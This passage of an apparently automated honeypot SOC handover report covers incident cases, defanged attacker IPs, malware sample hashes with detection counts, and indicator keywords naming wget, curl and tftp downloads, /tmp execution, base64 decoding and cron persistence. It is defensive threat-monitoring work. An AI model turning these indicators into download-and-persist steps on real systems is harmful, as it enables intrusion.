| `2026-08-08 14:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb76be430ae

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:45 |
| **Last Seen** | 2026-08-08 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:45:56` | `cowrie.session.connect` |
| `2026-08-08 14:45:56` | `cowrie.login.success` |
| `2026-08-08 14:45:57` | `cowrie.session.params` |
| `2026-08-08 14:45:57` | `cowrie.command.input` |
| `2026-08-08 14:45:57` | `cowrie.command.failed` |
| `2026-08-08 14:45:57` | `cowrie.command.input` |
| `2026-08-08 14:45:57` | `cowrie.command.failed` |
| `2026-08-08 14:45:57` | `cowrie.command.input` |
| `2026-08-08 14:45:57` | `cowrie.log.closed` |
| `2026-08-08 14:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1019b577e9fe

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:45 |
| **Last Seen** | 2026-08-08 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:45:57` | `cowrie.session.connect` |
| `2026-08-08 14:45:57` | `cowrie.login.success` |
| `2026-08-08 14:45:58` | `cowrie.session.params` |
| `2026-08-08 14:45:58` | `cowrie.command.input` |
| `2026-08-08 14:45:58` | `cowrie.command.failed` |
| `2026-08-08 14:45:58` | `cowrie.command.input` |
| `2026-08-08 14:45:58` | `cowrie.command.failed` |
| `2026-08-08 14:45:58` | `cowrie.command.input` |
| `2026-08-08 14:45:58` | `cowrie.log.closed` |
| `2026-08-08 14:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d2ed76dc1e

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:45 |
| **Last Seen** | 2026-08-08 14:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:45:58` | `cowrie.session.connect` |
| `2026-08-08 14:45:58` | `cowrie.login.success` |
| `2026-08-08 14:45:59` | `cowrie.session.params` |
| `2026-08-08 14:45:59` | `cowrie.command.input` |
| `2026-08-08 14:45:59` | `cowrie.command.failed` |
| `2026-08-08 14:45:59` | `cowrie.command.input` |
| `2026-08-08 14:45:59` | `cowrie.command.failed` |
| `2026-08-08 14:45:59` | `cowrie.command.input` |
| `2026-08-08 14:45:59` | `cowrie.log.closed` |
| `2026-08-08 14:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbae748b8a92

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:45 |
| **Last Seen** | 2026-08-08 14:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:45:59` | `cowrie.session.connect` |
| `2026-08-08 14:45:59` | `cowrie.login.success` |
| `2026-08-08 14:46:00` | `cowrie.session.params` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.command.failed` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.command.failed` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.log.closed` |
| `2026-08-08 14:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57839df4c5bc

| Field | Detail |
|---|---|
| **Source IP** | `167.172.108[.]50` |
| **First Seen** | 2026-08-08 14:46 |
| **Last Seen** | 2026-08-08 14:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:46:00` | `cowrie.session.connect` |
| `2026-08-08 14:46:00` | `cowrie.login.success` |
| `2026-08-08 14:46:00` | `cowrie.session.params` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.command.failed` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.command.failed` |
| `2026-08-08 14:46:00` | `cowrie.command.input` |
| `2026-08-08 14:46:00` | `cowrie.log.closed` |
| `2026-08-08 14:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.108[.]50` to AbuseIPDB if not already reported
- [ ] Block `167.172.108[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f9323b9dbc9

| Field | Detail |
|---|---|
| **Source IP** | `64.49.97[.]15` |
| **First Seen** | 2026-08-08 14:48 |
| **Last Seen** | 2026-08-08 14:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:48:33` | `cowrie.session.connect` |
| `2026-08-08 14:48:34` | `cowrie.client.version` |
| `2026-08-08 14:48:34` | `cowrie.client.kex` |
| `2026-08-08 14:48:35` | `cowrie.login.success` |
| `2026-08-08 14:48:35` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.49.97[.]15` to AbuseIPDB if not already reported
- [ ] Block `64.49.97[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638ac8bc419e

| Field | Detail |
|---|---|
| **Source IP** | `82.102.149[.]88` |
| **First Seen** | 2026-08-08 14:48 |
| **Last Seen** | 2026-08-08 14:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 14:48:44` | `cowrie.session.connect` |
| `2026-08-08 14:48:45` | `cowrie.client.version` |
| `2026-08-08 14:48:45` | `cowrie.client.kex` |
| `2026-08-08 14:48:46` | `cowrie.login.success` |
| `2026-08-08 14:48:46` | `cowrie.direct-tcpip.request` |
| `2026-08-08 14:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.149[.]88` to AbuseIPDB if not already reported
- [ ] Block `82.102.149[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `194.165.16[.]122` | **9** | 2026-08-08 13:16 | 2026-08-08 14:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-08 12:55 | 2026-08-08 14:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `136.64.39[.]43` | **3** | 2026-08-08 12:55 | 2026-08-08 13:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `164.92.115[.]22` | **3** | 2026-08-08 12:57 | 2026-08-08 13:39 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.104.11[.]34` | **3** | 2026-08-08 13:38 | 2026-08-08 13:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.107.171[.]107` | **2** | 2026-08-08 13:32 | 2026-08-08 13:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.14.93[.]87` | **2** | 2026-08-08 14:35 | 2026-08-08 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | **2** | 2026-08-08 13:37 | 2026-08-08 14:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.2.88[.]64` | 1 | 2026-08-08 13:53 | 2026-08-08 13:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]11` | 1 | 2026-08-08 13:25 | 2026-08-08 13:25 | 3s | 0 | `T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-08-08 14:35 | 2026-08-08 14:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-08-08 13:19 | 2026-08-08 13:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.86.227[.]79` | 1 | 2026-08-08 14:14 | 2026-08-08 14:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `163.177.76[.]83` | 1 | 2026-08-08 13:40 | 2026-08-08 13:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-08 14:35 | 2026-08-08 14:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.10.197[.]168` | 1 | 2026-08-08 13:53 | 2026-08-08 13:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.139.39[.]150` | 1 | 2026-08-08 14:13 | 2026-08-08 14:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-08 13:03 | 2026-08-08 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.162.234[.]66` | 1 | 2026-08-08 13:06 | 2026-08-08 13:06 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-08 13:37 | 2026-08-08 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.94.201[.]66` | 1 | 2026-08-08 14:11 | 2026-08-08 14:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.34.174[.]90` | 1 | 2026-08-08 13:26 | 2026-08-08 13:26 | 3s | 0 | `T1592` | 🟢 LOW |
| `61.145.163[.]164` | 1 | 2026-08-08 13:26 | 2026-08-08 13:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.121.102[.]227` | 1 | 2026-08-08 13:17 | 2026-08-08 13:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-08-08 14:16 | 2026-08-08 14:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-08-08 14:28 | 2026-08-08 14:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-08 14:47 | 2026-08-08 14:48 | 75s | 0 | `T1592` | 🟢 LOW |
| `93.177.157[.]179` | 1 | 2026-08-08 14:14 | 2026-08-08 14:14 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 40/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `163.177.76[.]83` | CN | China Unicom Guangdong province network | **100** ⚠️ | 6 |
| `104.2.88[.]64` | US | AT&T Enterprises, LLC | **100** ⚠️ | 6 |
| `118.183.180[.]108` | CN | CHINANET Gansu province network | **100** ⚠️ | 50 |
| `167.172.108[.]50` | DE | DigitalOcean, LLC | **100** ⚠️ | 35 |
| `194.165.16[.]122` | LT | Flyservers S.A. | **100** ⚠️ | 13 |
| `45.162.234[.]66` | BR | Wib Provedores de Acesso LTDA - EPP | **100** ⚠️ | 1 |
| `193.107.171[.]107` | UA | PE UAinet | **100** ⚠️ | 0 |
| `154.221.25[.]99` | HK | Yisu Cloud Ltd | **100** ⚠️ | 7 |
| `45.33.12[.]214` | US | Linode | **100** ⚠️ | 50 |
| `196.191.151[.]172` | ET | ER-Phase-II-Project | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 56 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 45 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 1 |

---

## 🔕 False Positive Summary (17 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 111 cases |
| Tool 34  | Credential Extractor        | ✅ 59 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 71 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 17 filtered (15.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 45 priority case(s) shown individually · 28 recon entry/entries in table (8 group(s) consolidating 29 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-08T16:38:24Z_
